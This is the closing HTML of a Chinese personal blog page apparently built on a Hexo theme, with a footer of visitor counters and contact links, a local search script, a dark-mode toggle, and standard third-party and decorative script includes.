            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
            }
        </script>
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
